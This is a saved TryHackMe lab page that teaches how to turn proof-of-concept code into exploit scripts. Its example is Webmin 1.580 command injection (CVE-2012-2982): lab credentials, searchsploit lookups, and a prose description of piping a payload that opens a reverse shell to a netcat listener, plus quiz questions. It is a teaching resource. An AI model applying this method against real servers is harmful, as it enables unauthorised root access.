<img class="img-streak" width="400px" alt="streak freeze unlocked" src="./TryHackMe _ Intro PoC Scripting_files/streak-freeze.svg">
</figure>
<h2>You've unlocked a streak freeze!</h2>
<p>With these one-time streak freezes, you can miss one day of hacking without losing your streak.</p>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Intro PoC Scripting_files/streak-freeze.js"></script>
<nav id="thm-mobile-nav-menu" class="thm-mobile-nav" aria-label="Mobile secondary navigation menu.">
<header>
<a href="https://tryhackme.com/" aria-label="Go to the home page">
<img width="140" src="./TryHackMe _ Intro PoC Scripting_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
<button id="thm-mobile-nav-close" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Close mobile navigation">
<i class="fal fa-times"></i>
</button>
</header>
<ul class="thm-mobile-nav-items mb-0">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="nav-title-icon far fa-browser"></i>
<div class="nav-title">Dashboard</div>
</a>
</li>
<li class="nav-item active">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="nav-title-icon far fa-book-open"></i>
<div class="nav-title">Learn</div>
</a>
</li>
<li class="nav-item ">
<a aria-expanded="false" aria-controls="mobile-nav-compete" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-compete" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-trophy"></i>
<div class="nav-title">Compete</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-compete" class="dropdown-wrapper">
<a href="https://tryhackme.com/leaderboards">
<div>
<i class="fas fa-trophy"></i>
</div>
<div>
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a href="https://tryhackme.com/games/koth">
<div>
<i class="fas fa-crown"></i>
</div>
<div>
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a href="https://tryhackme.com/workspace">
<div>
<i class="fas fa-user-friends"></i>
</div>
<div>
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item">
<a aria-expanded="false" aria-controls="mobile-nav-other" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-other" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-ellipsis-h-alt"></i>
<div class="nav-title">Other</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-other" class="dropdown-wrapper">
<a href="https://tryhackme.com/resources">Resources</a>
<a href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a href="https://tryhackme.com/business">For Business</a>
<a href="https://tryhackme.com/classrooms">For Education</a>
<a target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
</div>
</li>
<li class="nav-item text-center">
<div class="nav-item-streak">
<span id="mobile-streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;span&gt;Your streak was saved by your 1 day streak freeze! 
        Answer today to stop it resetting tomorrow.&lt;/span&gt;" data-original-title="" title="">
<span id="mobile-user-streak" data-streak="7" class="hacker-green" style="color: rgb(226, 141, 52);">7 <i class="fas fa-fire-alt"></i></span>
</span>
</div>
</li>
<li class="nav-item text-center">
<a class="nav-link size-22 d-inline-block" href="https://tryhackme.com/room/intropocscripting#" id="mobile-notification-btn" role="button" data-toggle="dropdown">
<i id="mobile-notification-icon" class="fal fa-bell"></i>
<div id="mobile-notification-dot"></div>
</a>
<div id="mobile-nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="mobile-notification-header">Notifications</div>
<div id="mobile-nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item text-center">
<a aria-expanded="false" aria-controls="mobile-nav-auth" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-auth" class="sublinks-toggle nav-link d-inline-block">
<img src="./TryHackMe _ Intro PoC Scripting_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div id="mobile-nav-auth" class="dropdown-wrapper">
<a href="https://tryhackme.com/profile">Profile</a>
<a href="https://tryhackme.com/referrals">Refer a friend</a>
<a href="https://tryhackme.com/badges">Badges</a>
<a href="https://tryhackme.com/rooms">My Rooms</a>
<a href="https://tryhackme.com/access">Access</a>
<a href="https://tryhackme.com/feedback">Give Feedback</a>
<a href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</nav>
<script defer="" src="./TryHackMe _ Intro PoC Scripting_files/mobile-nav.js"></script>
<script>
  const userSignedUpLessThanSevenDaysAgo = Math.floor(
    (new Date() - new Date('Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)')) / (1000 * 60 * 60 * 24) < 7
  );

  const userHasFirst4RoomsBadge = !!``;
  const isBeginner = `advanced` === 'complete-beginner';
</script>
<script src="./TryHackMe _ Intro PoC Scripting_files/notifications.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/streak-freeze(1).js"></script>
<div id="wrapper">
<div id="room-banner" class="shadow-light">
<img id="room-image-large" src="./TryHackMe _ Intro PoC Scripting_files/default_tryhackme.png">
<div>
<div id="room-details">
<div class="container">
<div class="page-header">
<div class="room-header">
<div id="room-voting" class="text-center vertical-align-custom">
<div class="voting-buttons">
<i class="fas fa-thumbs-up display-block" onclick="makeVote(true)" id="vote-up" style="color: rgb(185, 185, 185);"></i>
<div class="display-block" id="vote-number">234</div>
<i class="fas fa-thumbs-down display-block" onclick="makeVote(false)" id="vote-down" style="color: rgb(185, 185, 185);"></i>
</div>
</div>
<div id="room-logo" class="vertical-align-custom">
<div id="logo"><img class="room-avatar" src="./TryHackMe _ Intro PoC Scripting_files/6142091b256a7e8d7b6e1fc9349bd425.png" onerror="replaceImg(this)"></div>
</div>
<div class="vertical-align-custom">
<div id="room-basic-data">
<div class="d-flex justify-content-between">
<h1 id="title" class="bold-head">Intro PoC Scripting</h1>
<div id="room-title-options">

<div class="btn-group" id="browser-machine-options" role="group" aria-label="Start AttackBox or Kali Linux" style="display: inline-flex;">
<button id="browser-machine-start" type="button" class="btn btn-secondary"><i class="far fa-laptop"></i> Start AttackBox</button>
<div class="btn-group" id="browser-machines" role="group">
<button id="btnGroupDrop1" type="button" class="btn btn-secondary dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></button>
<div class="dropdown-menu" aria-labelledby="btnGroupDrop1">
<a class="dropdown-item  preventDefault" href="https://tryhackme.com/room/intropocscripting#" onclick="changeMyMachine(&quot;kali-linux&quot;)">
<span class="mb-0">Use Kali Linux</span>
<div class="text-lgray size-12">Web-based Kali Machine</div>
</a>
<a class="dropdown-item preventDefault" href="https://tryhackme.com/room/intropocscripting#" onclick="changeMyMachine(&quot;attackbox&quot;)">
<span class="mb-0">Use AttackBox</span>
<div class="text-lgray size-12">Recommended</div>
</a>
</div>
</div>
</div>
<button id="browser-machine-split-view" type="button" class="btn btn-secondary">Show Split View</button>
<button id="cloud-details" type="button" class="btn btn-info"><i class="far fa-clouds mr-1"></i>Cloud Details</button>
<span id="awards-model-btn" data-toggle="modal" data-target="#award-modal" class="badge badge-warning ml-1 noselect">Awards</span>
<span id="room-faq-slideout" type="button" class="badge badge-info ml-1 noselect d-inline-flex" onclick="openHelpMenu()">
Help
</span>
<div class="dropright room-dropright noselect ml-1" id="room-options" style="display: inline-block;">
<span class="badge badge-secondary" data-toggle="dropdown">
<i class="fas fa-cog"></i>
</span>
<div class="dropdown-menu">
<a class="dropdown-item" href="https://tryhackme.com/api/room/manage/clone/intropocscripting" id="clone-room" style="display: none;"><i class="far fa-clone faded"></i> Clone Room</a>
<a class="dropdown-item preventDefault" id="writeups-simple" style="display: inline-block;"><i class="fas fa-pen-alt faded"></i> Writeups</a>
<a class="dropdown-item preventDefault" data-toggle="modal" data-target="#resetUserProgressModal"><i class="fas fa-eraser faded"></i> Reset Progress</a>
<a class="dropdown-item preventDefault" id="leave-room"><i class="fas fa-sign-out-alt faded"></i> Leave</a>
</div>
</div>
<span id="bookmark" class="badge badge-secondary badge-bookmark ">
<img class="bookmark" src="./TryHackMe _ Intro PoC Scripting_files/bookmark.svg">
<span class="bookmark-popover" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="top" data-content="&lt;p class=&#39;mb-0&#39;&gt;Save room &lt;/p&gt;
" data-original-title="" title="">
</span>
</span>
</div>
</div>
<p class="mb0 faded" id="description">Learn the importance and beginner skills of crafting custom proof of concept (PoC) exploit scripts from many different sources.</p>
</div>
</div>
</div>
</div>

</div>
</div>
<div id="room-banner-stats">
<div class="creators"></div>
<div class="numbers"></div>
</div>
</div>
</div>
<div class="container main pb">
<div id="room-message"></div>
<section id="sponsor">
<i id="sponsor-close" class="fas fa-times"></i>
<div id="sponsor-data"></div>
</section>
<div id="top-panel">
<ul class="nav nav-tabs" id="task-navs">
<li class="nav-item">
<a class="nav-link  active " data-toggle="tab" href="https://tryhackme.com/room/intropocscripting#chart">
<i class="fas fa-chart-line icon-right"></i> Chart
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/intropocscripting#scoreboard">
<i class="fas fa-trophy icon-right"></i> Scoreboard
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/intropocscripting#chat">
<i class="fas fa-comments-alt icon-right chat-icon"></i> Discuss
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/intropocscripting#writeups">
<i class="fas fa-pen-alt icon-right"></i> Writeups
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/intropocscripting#about">
<i class="fas fa-info-circle icon-right"></i> More
</a>
</li>
</ul>
<div class="card cd-2 nav-above-con" id="room-main">
<div class="card-body">
<span id="room-tabs">
<div class="tab-content">
<div id="chart" class="tab-pane  active ">
<span id="difficulty-bar">
    <span class="room-difficulty diff-text">
      Difficulty: 
        <span class="difficulty-easy">Easy</span>
    </span></span>
<br><div id="chart-data"></div>
</div>
<div id="scoreboard" class="tab-pane fade">
<table class="table table-striped table-bordered table-condensed table-header-rotated mb-0" id="scoreboard_table">
<thead>
<tr id="scoreboard_header">
<th>Rank</th>
<th>Username</th>
<th>Total Score</th>
</tr>
</thead>
<tbody id="scoreboard_body"></tbody>
</table>
</div>
<div id="chat" class="tab-pane fade">

<div class="row">
<div class="col-sm-6 text-center">
<h3 class="mb-2">Discord</h3>
<p>Come join our <a target="_blank" href="https://discord.gg/QgC6Tdk">Discord</a> server for support or further discussions</p>
</div>
<div class="col-sm-6 text-center">
<h3 class="mb-2">Forum</h3>
<div id="forum-text">Search our <a href="https://tryhackme.com/forum">forum</a> for pre-existing threads about this room, or create your own!</div>
</div>
</div>
</div>
<div id="writeups" class="tab-pane text-center">
<div id="writeups-data">There are no writeups submitted.</div>
<button onclick="showWriteupForm(this)" type="button" class="btn btn-xs btn-secondary mt-3 mb-2">Add Writeup</button>
<div id="writeup-form">
<div class="form-row">
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-title" placeholder="Writeup Title">
</div>
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-link" placeholder="Writeup URL">
</div>
<div class="col-auto">
<button id="submit-writeup" type="submit" class="btn btn-success mb-2">Submit</button>
</div>
</div>
<p class="faded mb-0 size-14"><i class="fas fa-exclamation-triangle text-warning"></i> Writeups should have a link to TryHackMe and not include any passwords/cracked hashes/flags</p>
</div>
</div>
<div id="about" class="tab-pane text-center">
<p id="about-freeRoom"><p class="mb-0">This is a <b>free</b> room, which means anyone can deploy virtual machines in the room 
        (without being subscribed)! 3950 users are in here and this room is 998 days old.</p></p>
<p id="about-owner"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Intro PoC Scripting_files/b7dacea71ff3d66f5a82e63c6451b76a.jpg"> 
        <a class="green-link" href="https://tryhackme.com/p/cd6629">cd6629</a></p></p>
</div>
</div>
</span>
</div>
</div>
</div>
<div id="room-simple-video" class="card card-body cd-2"></div>
<div class="card mt-3 mb-3 cd-2 text-center" id="instance-info">
<div class="card-header card-header-red">Active Machine Information</div>
<div class="card-body">
<div class="row vertical-align-custom">
<div class="col-sm-3">
<i>Loading...</i>
</div>
<div class="col-sm-3" id="table-machine-ip">
<i>Loading...</i>
</div>
<div class="col-sm-3">
<i>Loading...</i>
</div>
<div class="col-sm-3">
<i>Loading...</i>
</div>
</div>
</div>
</div>
<div id="task-list">
<div id="room-task-detail" class="mb-3"><span id="progress-bar" style="display: block;"><div class="progress"><div class="progress-bar bg-secondary" role="progressbar" style="width: 5%; aria-valuemin=" 0"="" aria-valuemax="100"> 0%</div></div></span></div>
<div id="taskContent"><div class="card" id="task-1">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse1">
                        <a class="card-link">
                            <span class="task-dropdown-title red">Task 1                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Introduction - What are PoC scripts?
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"><i class="far fa-server text-lgreen" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a deployable machine"></i></span>
                        </a>
                    </div>
                    <div id="collapse1" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-incomplete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"><div class="btn-group mb-3 ml-3 float-right">
            <button type="button" class="btn btn-success" value="5f5446c0ce6ebe3793336c95" onclick="deploy(this)"><i class="fas fa-play mr-2"></i> Start Machine</button>
        </div> <p><i><b><span style="font-family:&quot;Arial&quot;;font-size:18px">Greetings!</span></b></i></p><p><span style="font-family:&quot;Arial&quot;">This room is an introduction to a fundamental skill of most cybersecurity domains; <i>exploit development</i> by <b>crafting exploit scripts from proof of concept code</b>. This room intends to introduce <i>beginner skills</i> and concepts that can be adapted to many different types of exploits.The prerequisite skills I'd recommend for this room are basic programming and penetration testing experience. <br></span></p><p><span style="font-family:&quot;Arial&quot;"><i><b>proof of concept</b></i><span> (<a class="nBQuG2ks glossary-term" onclick="initPopOver(&#39;PoC&#39;, &#39;nBQuG2ks&#39;)">PoC</a>): </span></span><span style="font-family:&quot;Arial&quot;"><span style="color:rgb(34, 34, 34);font-family:Roboto, arial, sans-serif;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:100;letter-spacing:normal;text-align:left;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-style:initial;text-decoration-color:initial;display:inline;float:none">evidence, typically derived from an experiment or pilot project, which demonstrates that a design concept, business proposal, etc., is feasible.</span></span></p><p><span style="font-family:&quot;Arial&quot;"><span style="color:rgb(34, 34, 34);font-family:Roboto, arial, sans-serif;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:100;letter-spacing:normal;text-align:left;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-style:initial;text-decoration-color:initial;display:inline;float:none"></span></span><span style="font-family:&quot;Arial&quot;"><span style="color:rgb(34, 34, 34);font-family:Roboto, arial, sans-serif;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:100;letter-spacing:normal;text-align:left;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-style:initial;text-decoration-color:initial;display:inline;float:none"><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;"><span style="color:rgb(34, 34, 34);font-family:Roboto, arial, sans-serif;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:100;letter-spacing:normal;text-align:left;text-indent:0px;text-transform:none;white-space:normal;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-style:initial;text-decoration-color:initial;display:inline;float:none">The
 term <i>exploit development</i><span> is sometimes strictly referred to writing 
programs that leverage buffer overflow attacks or reverse engineer binary
 files, here it's being used more broadly as taking the contents of a CVE and PoC code to
 incite unintended behavior of the target system and gain
privileged access. </span></span></span></span></span></span></p><p><u><b><span style="font-family:&quot;Arial&quot;;font-size:24px"><span>Why learn to write <a class="JUYGvP8J glossary-term" onclick="initPopOver(&#39;PoC&#39;, &#39;JUYGvP8J&#39;)">PoC</a> scripts and exploit development?</span></span></b></u></p><p><span style="font-family:&quot;Arial&quot;">When many students are first introduced to penetration testing and hacking in general, they tend to want to use the easiest route, aka, automating tasks with metasploit. While metasploit is a convenient tool and has a wide range of applications, it takes the focus away from what we are actually exploiting and <b>why</b> something is vulnerable. Being able to examine proof of concept code and craft custom payloads will not only improve exploit development skills, but also skills in the language used to develop them. Ultimately, understanding the intimate and complex details of why something is vulnerable is an essential skill for all facets of information security. <br></span></p><p><span style="font-family:&quot;Arial&quot;">﻿For those studying for practical certifications, we're expected to </span><span style="font-family:&quot;Arial&quot;">adapt proof of concept code from various sources that does </span><em><span style="font-family:&quot;Arial&quot;">not</span></em><span style="font-family:&quot;Arial&quot;"> do what we want immediately, but provides a path to a vulnerable spot in the target system and a method for exploiting. No matter the type of exploit it's expected that we're able to look at the source code (e.g ruby code of metasploit module or bug trackers), identify the exact exploitable endpoint, what 
parameters get sent, and <u>write a small script that sends the appropriate
 parameters to that endpoint with a custom payload.</u> Not every vulnerability that exists will have a pre-made exploit script to use but, if you learn and practice how to make them yourself, you'll acquire a deeper understanding of cybersecurity topics and accumulate more technical skills.</span></p><p><b><u><span style="font-family:&quot;Arial&quot;;font-size:24px">Methodologies</span></u></b></p><p><span style="font-family:&quot;Arial&quot;">As this room uses one isolated example, we cannot apply the knowledge used here to every script we write. However, as you practice this concept more, you will begin to notice patterns and generalities that can be applied more broadly. A handful of common methodologies I've found thus far include:</span></p><ul><li><span style="font-family:&quot;Arial&quot;"><b>Optimize the script and condense unnecessary code</b>: keep it simple stupid<br></span></li><li><span style="font-family:&quot;Arial&quot;"><b><span>Read and reread <a class="hIP0VzBE glossary-term" onclick="initPopOver(&#39;PoC&#39;, &#39;hIP0VzBE&#39;)">PoC</a> code before researching</span></b>: assists in identifying errors in scripts and how to fix them, sometimes before they occur<br></span></li><li><span style="font-family:&quot;Arial&quot;"><b>Research as detailed as possible</b>: not all essential information is found on documentation and stackoverflow<br></span></li><li><span style="font-family:&quot;Arial&quot;"><b>Prepare to adapt and customize</b><span>: <a class="suLlWq8B glossary-term" onclick="initPopOver(&#39;PoC&#39;, &#39;suLlWq8B&#39;)">PoC</a> code sometimes uses pre-made libraries with specific functions you'll need to personally craft</span><br></span></li><li><span style="font-family:&quot;Arial&quot;"><b>Test segments of code along the way</b>: this makes it easier to pinpoint potential issues</span><span style="font-family:&quot;Arial&quot;"></span><br><span style="font-family:&quot;Arial&quot;"></span></li></ul></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Please read the introduction description<br>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="1">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Completed
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-2">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse2">
                        <a class="card-link">
                            <span class="task-dropdown-title red">Task 2                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Example - The starting point
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse2" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-incomplete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span>﻿</span><span><span style="font-family:&quot;Arial&quot;"><span>In terms of CTFs, vulnerability scanning, penetration testing, and across an extensive array of security fields, writing <a class="75xg1DM8 glossary-term" onclick="initPopOver(&#39;PoC&#39;, &#39;75xg1DM8&#39;)">PoC</a> scripts can be used to assist or completely accomplish one's task a majority of the time. As a result of this, it is one of the most flexible skills to possess and master over time. It is easier to practice with intentionally vulnerable boxes that have known CVE details and documentation as a beginner. </span><br></span></span></p><p><span><span style="font-family:&quot;Arial&quot;"><span>The first encounter I had on tryhackme where I wanted to avoid metasploit to learn manual exploitation, I could not find a relevant public exploit to suit my needs. To escalate local privileges I had to either use metasploit or analyze the metasploit module's ruby source code and make a custom <a class="ikprvhoq glossary-term" onclick="initPopOver(&#39;PoC&#39;, &#39;ikprvhoq&#39;)">PoC</a> script. This vulnerability was discovered over eight years ago, but it's a very appropriate beginner example to expose the requirements of learning exploit development. </span><br></span></span></p><p><span><span style="font-family:&quot;Arial&quot;"><u><span style="font-size:18px">Credentials</span></u><br></span></span></p><p><span><span style="font-family:&quot;Arial&quot;"><i>username:</i> user1</span></span></p><span><span style="font-family:&quot;Arial&quot;"><i>password:</i> 1user</span></span><p><span><span style="font-family:&quot;Arial&quot;"></span></span></p><p><span><span style="font-family:&quot;Arial&quot;">In this room we'll be using python to craft our script, but any scripting language would be suitable. For the sake of focusing on development, we'll be skipping enumeration and simulate a situation where we have low-level user access. Enter the IP address into a browser, visit the website, and enter the above credentials. With our local access we can clearly see the <b>platform</b> and <b>version number</b>.</span></span></p><p><img style="width:727.95px;height:186.746px;float:none" src="./TryHackMe _ Intro PoC Scripting_files/xgUhTfd.png"><br></p><p><span><span style="font-family:&quot;Arial&quot;"></span></span></p><p><span><span style="font-family:&quot;Arial&quot;"></span></span></p><p><span><span style="font-family:&quot;Arial&quot;"></span></span></p><p><span><span style="font-family:&quot;Arial&quot;"></span></span></p><p><span><span style="font-family:&quot;Arial&quot;"><br></span></span></p><p><span><span style="font-family:&quot;Arial&quot;">We can use a native Kali tool </span></span><code>searchsploit</code><span><span style="font-family:&quot;Arial&quot;"> to inspect the platform and version number, it parses the exploit-db website for known exploits.</span></span></p><p><code>searchsploit webmin 1.580</code><span><span style="font-family:&quot;Arial&quot;"></span></span></p><p><img style="width:980.817px;height:113.067px" src="./TryHackMe _ Intro PoC Scripting_files/ZgKyRt3.png"><span><span style="font-family:&quot;Arial&quot;"><br></span></span></p><p><span><span style="font-family:&quot;Arial&quot;">There is</span></span><span><span style="font-family:&quot;Arial&quot;"> <i>.rb</i> code for our exact target, lets inspect the contents with </span></span><code>cat /usr/share/exploitdb/exploits/unix/remote/21851.rb</code><span><span style="font-family:&quot;Arial&quot;"><br></span></span></p><p><img style="width:825.95px;height:377.502px;float:none" src="./TryHackMe _ Intro PoC Scripting_files/YW8O7Lo.png"><br></p><p><span><span style="font-family:&quot;Arial&quot;">We'll be using metasploit's code repository as a starting point, </span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/webmin_show_cgi_exec.rb" target="_blank"><span><span style="font-family:&quot;Arial&quot;">this module to be exact</span></span></a><span><span style="font-family:&quot;Arial&quot;">. The module exploits an arbitrary command execution vulnerability in Webmin 1.580, </span></span><b><u><a class="link-a079aa82--primary-53a25e66--link-faf6c434" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2982" target="_blank"><span><span style="font-family:&quot;Arial&quot;"><span>CVE-2012-2982</span></span></span></a></u></b><span><span style="font-family:&quot;Arial&quot;">. The vulnerability exists in the</span><span style="font-family:&quot;Arial&quot;"><em> /file/show.cgi</em></span><span style="font-family:&quot;Arial&quot;"> component and allows an authenticated user, with access to the File Manager Module, to <b>execute arbitrary commands with root privileges</b>.</span></span></p><p><span style="font-family:&quot;Arial&quot;"><b><u><span style="font-size:24px">What does this mean?</span></u></b><br></span></p><p><span style="font-family:&quot;Arial&quot;">On the surface level, we know that we can execute any program we want on this Ubuntu server. In most scenarios it makes sense to execute the <b>system shell</b><span>, especially when we have root or administrator privileges. It enables us to have complete control over the target system and manipulate it to our needs. Let's take a more detailed look at the <a class="NZaNPQWz glossary-term" onclick="initPopOver(&#39;CVE&#39;, &#39;NZaNPQWz&#39;)">CVE</a> description and explain exactly what it means. </span><br></span></p><p><span style="font-family:&quot;Arial&quot;"><i><span style="font-size:18px"><span><a class="gxqUPMKT glossary-term" onclick="initPopOver(&#39;CVE&#39;, &#39;gxqUPMKT&#39;)">CVE</a> description</span></span></i>:</span><span style="font-family:&quot;Arial&quot;"><strong> <i>file/show.cgi</i></strong></span><i><span style="font-family:&quot;Arial&quot;"> in </span><span style="font-family:&quot;Arial&quot;"><strong>Webmin 1.590</strong></span><span style="font-family:&quot;Arial&quot;"> and earlier allows </span><span style="font-family:&quot;Arial&quot;"><strong>remote authenticated users</strong></span><span style="font-family:&quot;Arial&quot;"> to </span><span style="font-family:&quot;Arial&quot;"><strong>execute arbitrary commands</strong></span><span style="font-family:&quot;Arial&quot;"> via an </span><span style="font-family:&quot;Arial&quot;"><strong>invalid character</strong></span><span style="font-family:&quot;Arial&quot;"> in a </span><span style="font-family:&quot;Arial&quot;"><strong>pathname</strong></span><span style="font-family:&quot;Arial&quot;">, as demonstrated by a </span><span style="font-family:&quot;Arial&quot;"><strong>| (pipe)</strong></span><span style="font-family:&quot;Arial&quot;"> character.<br></span></i><br><span style="font-family:&quot;Arial&quot;"><span>This means that an input invalidation flaw within the binary file of show.cgi, exploited using a | (pipe) character, allows for remote authenticated attackers to execute any command as a privileged user. Meaning all we need to do is input invalid characters and pipe those to a system command (system shell). </span></span><span style="font-family:&quot;Arial&quot;"><span><span style="font-family:&quot;Arial&quot;"><span>We can </span><span><strong>execute the payload, open a socket connection and send it back to the attacker</strong></span><span> listening with </span><span><code class="code-81e98f88">netcat</code></span></span><br></span></span></p><p><span style="font-family:&quot;Arial&quot;"><span><u><b><span style="font-size:24px">Understanding the vulnerability</span></b></u><br></span></span></p><p><span style="font-family:&quot;Arial&quot;"><span><a class="Ky10ksbt glossary-term" onclick="initPopOver(&#39;CVE&#39;, &#39;Ky10ksbt&#39;)">CVE</a> documentation provides resources that can better highlight and demonstrate the source of vulnerabilities. </span></span><span style="font-family:&quot;Arial&quot;"><span style="font-family:&quot;Arial&quot;">In open source software, developers keep public track of bugs their platforms and systems produce, usually on github. </span> For this particular exploit, the before and after of the bug that led to CVE-2012-2982 is <a href="https://github.com/webmin/webmin/commit/1f1411fe7404ec3ac03e803cfa7e01515e71a213" target="_blank">documented on github</a>, the vulnerability and how it was fixed.</span></p><p><img style="width:465.95px;height:402.854px" src="./TryHackMe _ Intro PoC Scripting_files/lxtOZjW.png"><span style="font-family:&quot;Arial&quot;"><br></span></p><p><span style="font-family:&quot;Arial&quot;">Here we can see a section of /file/show.cgi as it exists in Webmin versions 1.590 and earlier. The highlighted red text indicates the vulnerability while the green indicates the patch. The <i>&lt;</i> operator was introduced to sanitize input of invalid characters, as demonstrated by <i>view_epathinfo.</i> As we know from the description, this input invalidation enables us to open any file we want.<i><br></i></span></p><p><img style="width:584.828px;height:237.15px" src="./TryHackMe _ Intro PoC Scripting_files/J1EQ8Sw.png"><span style="font-family:&quot;Arial&quot;"><i><br></i> </span></p><p><span style="font-family:&quot;Arial&quot;">This is a very small but vital piece of information to know before analyzing the metasploit module, it gives us a clear picture of what we are taking advantage of and what to strive towards while analyzing the code.</span></p><p><span style="font-family:&quot;Arial&quot;">As of the time of this room's creation, I could not find a public exploit script for CVE-2012-2982, leaving us the only option to make one for ourselves.<br></span><br></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                What is the target's platform and version number?<br>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ****** *.***" value="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p><span>What is the associated <a class="C1IquWQj glossary-term" onclick="initPopOver(&#39;CVE&#39;, &#39;C1IquWQj&#39;)">CVE</a> for this platform?</span><br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *************" value="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Which file does the vulnerability exist in?<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
